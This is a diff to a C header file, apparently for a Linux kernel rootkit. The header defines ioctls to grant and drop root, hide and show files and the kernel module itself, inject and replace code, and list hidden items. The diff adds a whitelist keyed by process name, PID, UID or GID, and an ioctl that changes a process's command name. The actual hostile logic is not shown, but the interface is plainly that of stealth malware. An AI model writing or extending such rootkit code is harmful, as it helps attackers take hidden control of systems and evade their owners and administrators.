@@ -15,20 +15,67 @@
 
 struct hide_request;
 struct dentry_identifier;
+struct whitelist_entry;
+struct comm_name;
 
 //ioctls for our interface
 #define ROOT_IOCTL         _IO('k', 1)
 #define UNROOT_IOCTL       _IO('k', 2)
 #define URAND_IOCTL        _IO('k', 3)
-#define HIDE_IOCTL         _IOW('k', 4,struct hide_request)
-#define SHOW_IOCTL         _IOW('k', 5,struct hide_request)
+#define HIDE_IOCTL         _IOW('k', 4, struct hide_request)
+#define SHOW_IOCTL         _IOW('k', 5, struct hide_request)
 #define LIST_HIDDEN_IOCTL  _IO('k', 6)
 #define INJECT_IOCTL       _IO('k', 7)
 #define REPLACE_IOCTL      _IO('k', 8)
 #define HIDE_MOD_IOCTL     _IO('k', 9)
 #define SHOW_MOD_IOCTL     _IO('k', 10)
+#define WHIT_ADD_IOCTL     _IOW('k', 11, struct white_request)
+#define WHIT_REM_IOCTL     _IOW('k', 12, struct white_request)
+#define WHIT_SHOW_IOCTL    _IO('k', 13)
+#define CHANGE_COMM_IOCTL  _IOW('k', 14, struct comm_name)
 
 #define procfs_file_name "hidden_files"
+#define procfs_whitelist_name "whitelist"
+/*
+#ifdef __KERNEL__
+extern const char *white_type_names[];
+#else
+static const char *white_type_names[] = {
+	"PROCNAME",
+	"PID",
+	"UID",
+	"GID",
+};
+#endif
+*/
+
+static const char *white_type_names[] = {
+	"PROCNAME",
+	"PID",
+	"UID",
+	"GID",
+};
+
+enum white_type {
+	INVALID = -1,
+	PROCNAME = 0,
+	PID = 1,
+	UID = 2,
+	GID = 3,
+};
+
+struct whitelist_entry {
+	enum white_type wtype;
+	union {
+		char name[16];
+		unsigned int id;
+	};
+};
+
+struct white_request {
+	int count;
+	struct whitelist_entry *entries;
+};
 
 struct dentry_identifier {
 	ino_t parent_ino;
@@ -45,5 +92,9 @@ struct dentry_identifier {
 struct hide_request {
 	int count;
 	struct dentry_identifier *idents;
+};
+
+struct comm_name {
+	char name[16];
 };
 #endif
